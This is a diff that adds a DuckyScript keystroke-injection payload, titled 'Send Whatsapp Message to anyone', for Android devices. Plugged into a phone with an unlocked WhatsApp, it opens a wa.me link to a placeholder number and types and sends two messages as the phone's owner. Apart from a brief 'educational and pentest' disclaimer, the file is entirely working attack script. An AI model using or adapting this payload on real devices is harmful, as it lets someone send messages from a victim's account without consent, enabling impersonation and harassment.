@@ -1,0 +1,23 @@
+REM # ---------------------------------------------------------------------------------------------------
+REM # Disclaimer: This script is for educational and pentest purposes ONLY! Use at your own risk!!
+REM # Title: Send Whatsapp Message to anyone
+REM # Author: Dinesh Kumar LinkedIn: dhina016
+REM # Target: Tested on Android 11 device, it may require changes to work on newer versions
+REM # Note: This script will only work if the target have whatsapp without lock
+REM # ---------------------------------------------------------------------------------------------------
+
+REM # Enter your phone here
+STRING https://wa.me/+91xxxxxxxxxx
+ENTER
+DELAY 2500
+REM # Enter your message here 
+STRING This is new message from dhina
+TAB
+TAB
+ENTER
+DELAY 1000
+REM # Enter your another message here 
+STRING This is another new message from dhina
+TAB
+TAB
+ENTER
